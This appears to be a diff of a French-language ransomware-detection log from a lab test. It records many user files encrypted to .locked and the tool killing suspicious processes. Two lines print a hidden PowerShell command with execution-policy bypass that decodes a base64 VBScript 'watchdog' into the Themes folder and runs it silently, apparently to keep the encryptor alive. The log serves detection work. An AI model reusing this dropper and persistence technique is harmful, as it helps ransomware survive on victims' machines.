@@ -8,3 +8,100 @@
 2025-07-24 12:49:56.483Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
 2025-07-24 12:49:56.483Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
 2025-07-24 12:49:56.694Z [🧨] Fichier chiffré détecté : c:\users\mehdi\3d objects\desktop.ini.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\.bash_history.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.ini.locked
+2025-07-24 13:18:43.012Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 13:18:43.012Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 13:18:43.219Z [🧨] Fichier chiffré détecté : c:\users\mehdi\3d objects\desktop.ini.locked
+2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\contacts\desktop.ini.locked
+2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\desktop\desktop.ini.locked
+2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\documents\desktop.ini.locked
+2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\downloads\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\links\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\onedrive\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\music\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\camera roll\desktop.ini.locked
+2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\saved pictures\desktop.ini.locked
+2025-07-24 13:18:44.454Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\bing.url.locked
+2025-07-24 13:18:44.454Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.lnk.locked
+2025-07-24 13:18:44.454Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\downloads.lnk.locked
+2025-07-24 13:18:45.068Z [🧨] Fichier chiffré détecté : c:\users\mehdi\saved games\desktop.ini.locked
+2025-07-24 13:18:45.476Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\desktop.ini.locked
+2025-07-24 13:18:45.476Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\winrt--{s-1-5-21-1349940229-2857808021-1114501214-1000}-.searchconnector-ms.locked
+2025-07-24 13:18:45.476Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\desktop.ini.locked
+2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
+2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
+2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\public\desktop.ini.locked
+2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\captures\desktop.ini.locked
+2025-07-24 13:18:45.891Z [🧨] Fichier chiffré détecté : c:\users\public\accountpictures\desktop.ini.locked
+2025-07-24 13:18:45.891Z [🧨] Fichier chiffré détecté : c:\users\public\documents\desktop.ini.locked
+2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\downloads\desktop.ini.locked
+2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\desktop.ini.locked
+2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\recordedtv.library-ms.locked
+2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\music\desktop.ini.locked
+2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\videos\desktop.ini.locked
+2025-07-24 13:18:46.309Z [🧨] Fichier chiffré détecté : c:\users\public\pictures\desktop.ini.locked
+2025-07-24 13:24:23.747Z [⚠️] Processus suspect détecté : c:\windows\system32\cmd.exe
+2025-07-24 13:24:23.748Z       Ligne de commande : c:\windows\system32\cmd.exe /c "powershell -windowstyle hidden -executionpolicy bypass -noprofile -command "$b64 = 't24grxjyb3igumvzdw1lie5lehqku2v0ifdzafnozwxsid0gq3jlyxrlt2jqzwn0kcjxu2nyaxb0llnozwxsiikku2v0ig9ialdnsvnlcnzpy2ugpsbhzxrpymply3qoindpbm1nbxrzolxcllxyb290xgnpbxyyiikkdgfyz2v0id0gikm6xfxvc2vyc1xcbwvozglcxerlc2t0b3bcxhjhbnnvbxdhcmvcxgvuy29kzxiuchkicndhdgnozg9ntmftzsa9icj3yxrjagrvzy52ynmicgptzxqgy29stwugpsbvympxtultzxj2awnllkv4zwnrdwvyesgiu0vmrunuicogrljptsbxaw4zml9qcm9jzxnzifdirvjfie5hbwu9j3dzy3jpchquzxhljybpuiboyw1lpsdjc2nyaxb0lmv4zscikqpjb3vudca9idakrm9yievhy2ggchjvyybjbibjb2xnzqogicagswygsw5tdhiotenhc2uochjvyy5db21tyw5ktgluzsksiexdyxnlkhdhdgnozg9ntmftzskpid4gmcbuagvuciagicagicagy291bnqgpsbjb3vudcaridekicagievuzcbjzgpozxh0cklmignvdw50id4gmsbuagvuciagicbxu2nyaxb0llf1axqkrw5kielmcgpsyw5kb21pemukv1njcmlwdc5tbgvlccaosw50kcg4mcaqifjuzckgkyaxmckgkiaxmdawkqokrg8kicagigzvdw5kid0grmfsc2ukicagifnldcbjb2xqcm9jzxnztglzdca9ig9ialdnsvnlcnzpy2uurxhly1f1zxj5kcjtruxfq1qgkibguk9nifdpbjmyx1byb2nlc3mgv0hfukugtmftzt0nchl0ag9ulmv4zscgt1igtmftzt0nchl0ag9udy5leguniikkicagiezvcibfywnoig9ialbyb2nlc3mgsw4gy29suhjvy2vzc0xpc3qkicagicagicbjzibjbln0cihmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtenhc2uoiiaiicygdgfyz2v0icygiiaikskgpiawie9yif8kicagicagicagicbsawdodchmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtgvukhrhcmdldckpid0gtenhc2uodgfyz2v0ksbuagvuciagicagicagicagigzvdw5kid0gvhj1zqogicagicagicagicbfegl0iezvcgogicagicagievuzcbjzgogicagtmv4daokicagielmie5vdcbmb3vuzcbuagvuciagicagicagv3nou2hlbgwuunvuicjwb3dlcnnozwxsic1xaw5kb3dtdhlszsbiawrkzw4gluv4zwn1dglvblbvbgljesbcexbhc3mglunvbw1hbmqgiijtdgfydc1qcm9jzxnzic1xaw5kb3dtdhlszsbiawrkzw4gluzpbgvqyxroicdwexrob253lmv4zscglufyz3vtzw50tglzdcaniiamihrhcmdldcamiciniiiilcawlcbgywxzzqogicagrw5kielmcgogicagv1njcmlwdc5tbgvlcca1mdawckxvb3ak'; $vbs = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($b64)); [system.io.file]::writealltext('c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs', $vbs); start-process -windowstyle hidden wscript.exe 'c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs'""
+2025-07-24 13:24:23.751Z [🔪] Kill tree PID=4376
+2025-07-24 13:24:23.754Z [⚠️] Processus suspect détecté : c:\windows\system32\windowspowershell\v1.0\powershell.exe
+2025-07-24 13:24:23.756Z       Ligne de commande : powershell  -windowstyle hidden -executionpolicy bypass -noprofile -command "$b64 = 't24grxjyb3igumvzdw1lie5lehqku2v0ifdzafnozwxsid0gq3jlyxrlt2jqzwn0kcjxu2nyaxb0llnozwxsiikku2v0ig9ialdnsvnlcnzpy2ugpsbhzxrpymply3qoindpbm1nbxrzolxcllxyb290xgnpbxyyiikkdgfyz2v0id0gikm6xfxvc2vyc1xcbwvozglcxerlc2t0b3bcxhjhbnnvbxdhcmvcxgvuy29kzxiuchkicndhdgnozg9ntmftzsa9icj3yxrjagrvzy52ynmicgptzxqgy29stwugpsbvympxtultzxj2awnllkv4zwnrdwvyesgiu0vmrunuicogrljptsbxaw4zml9qcm9jzxnzifdirvjfie5hbwu9j3dzy3jpchquzxhljybpuiboyw1lpsdjc2nyaxb0lmv4zscikqpjb3vudca9idakrm9yievhy2ggchjvyybjbibjb2xnzqogicagswygsw5tdhiotenhc2uochjvyy5db21tyw5ktgluzsksiexdyxnlkhdhdgnozg9ntmftzskpid4gmcbuagvuciagicagicagy291bnqgpsbjb3vudcaridekicagievuzcbjzgpozxh0cklmignvdw50id4gmsbuagvuciagicbxu2nyaxb0llf1axqkrw5kielmcgpsyw5kb21pemukv1njcmlwdc5tbgvlccaosw50kcg4mcaqifjuzckgkyaxmckgkiaxmdawkqokrg8kicagigzvdw5kid0grmfsc2ukicagifnldcbjb2xqcm9jzxnztglzdca9ig9ialdnsvnlcnzpy2uurxhly1f1zxj5kcjtruxfq1qgkibguk9nifdpbjmyx1byb2nlc3mgv0hfukugtmftzt0nchl0ag9ulmv4zscgt1igtmftzt0nchl0ag9udy5leguniikkicagiezvcibfywnoig9ialbyb2nlc3mgsw4gy29suhjvy2vzc0xpc3qkicagicagicbjzibjbln0cihmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtenhc2uoiiaiicygdgfyz2v0icygiiaikskgpiawie9yif8kicagicagicagicbsawdodchmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtgvukhrhcmdldckpid0gtenhc2uodgfyz2v0ksbuagvuciagicagicagicagigzvdw5kid0gvhj1zqogicagicagicagicbfegl0iezvcgogicagicagievuzcbjzgogicagtmv4daokicagielmie5vdcbmb3vuzcbuagvuciagicagicagv3nou2hlbgwuunvuicjwb3dlcnnozwxsic1xaw5kb3dtdhlszsbiawrkzw4gluv4zwn1dglvblbvbgljesbcexbhc3mglunvbw1hbmqgiijtdgfydc1qcm9jzxnzic1xaw5kb3dtdhlszsbiawrkzw4gluzpbgvqyxroicdwexrob253lmv4zscglufyz3vtzw50tglzdcaniiamihrhcmdldcamiciniiiilcawlcbgywxzzqogicagrw5kielmcgogicagv1njcmlwdc5tbgvlcca1mdawckxvb3ak'; $vbs = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($b64)); [system.io.file]::writealltext('c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs', $vbs); start-process -windowstyle hidden wscript.exe 'c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs'"
+2025-07-24 13:24:23.758Z [🔪] Kill tree PID=7904
+2025-07-24 13:24:25.784Z [🧨] Fichier chiffré détecté : c:\users\mehdi\.bash_history.locked
+2025-07-24 13:24:25.786Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 13:24:25.789Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 13:24:25.790Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 13:24:25.792Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 13:24:25.793Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 13:24:25.796Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.ini.locked
+2025-07-24 13:24:25.998Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 13:24:26.001Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 13:24:26.206Z [🧨] Fichier chiffré détecté : c:\users\mehdi\3d objects\desktop.ini.locked
+2025-07-24 13:24:27.019Z [🧨] Fichier chiffré détecté : c:\users\mehdi\contacts\desktop.ini.locked
+2025-07-24 13:24:27.021Z [🧨] Fichier chiffré détecté : c:\users\mehdi\desktop\desktop.ini.locked
+2025-07-24 13:24:27.024Z [🧨] Fichier chiffré détecté : c:\users\mehdi\documents\desktop.ini.locked
+2025-07-24 13:24:27.025Z [🧨] Fichier chiffré détecté : c:\users\mehdi\downloads\desktop.ini.locked
+2025-07-24 13:24:27.228Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\desktop.ini.locked
+2025-07-24 13:24:27.230Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.ini.locked
+2025-07-24 13:24:27.231Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\links\desktop.ini.locked
+2025-07-24 13:24:27.234Z [🧨] Fichier chiffré détecté : c:\users\mehdi\onedrive\desktop.ini.locked
+2025-07-24 13:24:27.235Z [🧨] Fichier chiffré détecté : c:\users\mehdi\music\desktop.ini.locked
+2025-07-24 13:24:27.236Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\desktop.ini.locked
+2025-07-24 13:24:27.238Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\camera roll\desktop.ini.locked
+2025-07-24 13:24:27.239Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\saved pictures\desktop.ini.locked
+2025-07-24 13:24:27.443Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\bing.url.locked
+2025-07-24 13:24:27.445Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.lnk.locked
+2025-07-24 13:24:27.447Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\downloads.lnk.locked
+2025-07-24 13:24:28.056Z [🧨] Fichier chiffré détecté : c:\users\mehdi\saved games\desktop.ini.locked
+2025-07-24 13:24:28.463Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\desktop.ini.locked
+2025-07-24 13:24:28.466Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\winrt--{s-1-5-21-1349940229-2857808021-1114501214-1000}-.searchconnector-ms.locked
+2025-07-24 13:24:28.468Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\desktop.ini.locked
+2025-07-24 13:24:28.672Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
+2025-07-24 13:24:28.674Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
+2025-07-24 13:24:28.675Z [🧨] Fichier chiffré détecté : c:\users\public\desktop.ini.locked
+2025-07-24 13:24:28.677Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\captures\desktop.ini.locked
+2025-07-24 13:24:28.879Z [🧨] Fichier chiffré détecté : c:\users\public\accountpictures\desktop.ini.locked
+2025-07-24 13:24:28.881Z [🧨] Fichier chiffré détecté : c:\users\public\documents\desktop.ini.locked
+2025-07-24 13:24:29.086Z [🧨] Fichier chiffré détecté : c:\users\public\downloads\desktop.ini.locked
+2025-07-24 13:24:29.087Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\desktop.ini.locked
+2025-07-24 13:24:29.089Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\recordedtv.library-ms.locked
+2025-07-24 13:24:29.090Z [🧨] Fichier chiffré détecté : c:\users\public\music\desktop.ini.locked
+2025-07-24 13:24:29.091Z [🧨] Fichier chiffré détecté : c:\users\public\videos\desktop.ini.locked
+2025-07-24 13:24:29.294Z [🧨] Fichier chiffré détecté : c:\users\public\pictures\desktop.ini.locked
+2025-07-24 13:28:34.800Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 13:28:34.816Z [🔪] Kill parent PID 1212 (python3.11.exe)
+2025-07-24 13:28:34.816Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 13:28:34.832Z [🔪] Kill parent PID 1212 (python3.11.exe)
+2025-07-24 13:28:35.066Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 13:28:35.082Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 13:28:35.301Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 13:28:35.316Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 13:28:35.332Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
